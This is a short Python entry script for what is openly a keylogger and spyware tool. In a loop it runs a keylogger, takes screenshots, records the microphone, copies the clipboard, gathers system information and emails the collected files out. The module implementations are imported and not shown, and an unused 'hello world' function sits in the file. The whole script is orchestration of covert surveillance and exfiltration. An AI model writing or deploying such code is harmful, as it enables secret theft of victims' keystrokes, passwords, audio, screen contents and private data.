from KeyLogger import KeyLogger
from SystemInfoProvider import SystemInfoProvider
from key_logger.eavesdrop import EavesdropService
from key_logger.mail import EmailService
from settings import number_of_iterations_end, file_path, filenames


def print_hello_world(name):
    print(f'Hello, {name}')


if __name__ == '__main__':
    eavesdrop = EavesdropService()
    key_logger = KeyLogger(file_path)

    number_of_iterations = 0
    while number_of_iterations < number_of_iterations_end:
        print("Starting Keylogger")
        key_logger.run()
        print("Starting Screenshot")
        eavesdrop.screenshot()
        print("Starting Microphone")
        eavesdrop.microphone()
        print("Starting Clippboard")
        eavesdrop.copy_clipboard()
        print("Starting SystemInfo")
        SystemInfoProvider().fetch_and_save_computer_information(file_path)
        print("Sending email")
        email_service = EmailService()
        email_service.send_email(filenames)

        number_of_iterations += 1
